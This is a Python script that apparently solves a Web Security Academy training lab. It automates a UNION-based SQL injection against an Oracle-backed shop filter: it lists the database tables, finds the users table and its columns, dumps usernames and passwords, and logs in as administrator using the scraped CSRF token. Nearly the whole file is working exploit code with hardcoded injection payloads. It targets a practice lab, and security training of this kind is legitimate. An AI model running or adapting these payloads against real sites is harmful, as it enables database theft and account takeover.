# Retrieving data from other database tables
# Examining DB- querying the database type and version on Oracle

import requests
from bs4 import BeautifulSoup
import re

# 2 columns - strings
url = "https://ac181fbf1fd9c0a480e407fc0007004f.web-security-academy.net/filter?category=Lifestyle"
url_login = "https://ac181fbf1fd9c0a480e407fc0007004f.web-security-academy.net/login"

s = requests.Session()

def get_user_table():
    payload1 = "'+UNION+SELECT+NULL,+table_name+FROM+all_tables--"
    r1 = s.get(url+payload1)
    #print(r1.text)
    soup1 = BeautifulSoup(r1.text, 'html.parser')
    user_table = soup1.body.findAll(text=re.compile('^users_',re.IGNORECASE))[0]
    return str(user_table)

def get_column_names(tablename):
    payload2 = f"'+UNION+SELECT+NULL,+column_name+FROM+all_tab_columns+where+table_name='{tablename}'--"
    r2 = s.get(url+payload2)
    soup2 = BeautifulSoup(r2.text, 'html.parser')
    user_column = soup2.body.findAll(text=re.compile('^username_',re.IGNORECASE))[0]
    pass_column = soup2.body.findAll(text=re.compile('^password_',re.IGNORECASE))[0]
    return user_column, pass_column

def get_admin_creds(user_column, pass_column, tablename):
    '''
    Grab all the usernames and password from the 'tablename' table, 
    search for admin/administrator and return creds if found
    '''
    payload3 = f"'+UNION+SELECT+{user_column},+{pass_column}+FROM+{tablename}--"
    r3 = s.get(url+payload3)
    soup3 = BeautifulSoup(r3.text, 'html.parser')
    for x in soup3.find_all("tr"):
        th = x.find("th").contents
        td = x.find("td").contents
        # print(th, td)         #print all usernames and passwords from the table
        if 'administrator' in th or 'admin' in th:
            admin_username = str(th[0]) 
            admin_password = str(td[0])
            return admin_username, admin_password
        else:
            print("Admin user not found")
            exit()

def solve():
    tablename = get_user_table()
    user_column, pass_column = get_column_names(tablename)
    username, password = get_admin_creds(user_column, pass_column, tablename)
    r_login = s.get(url_login)
    soup4 = BeautifulSoup(r_login.text, 'html.parser')
    csrftoken = soup4.find('input', attrs = {"name":"csrf"})['value']
    payload = {
    'csrf' : csrftoken,
    'username' : username,
    'password' : password
    }
    try:  
        r_solve = s.post(url_login, payload)
        if "Congratulations, you solved the lab!" in r_solve.text:
            print("yeet!")
        else:
            print("sad noises :(")
    except Exception as e:
        print(e)

solve()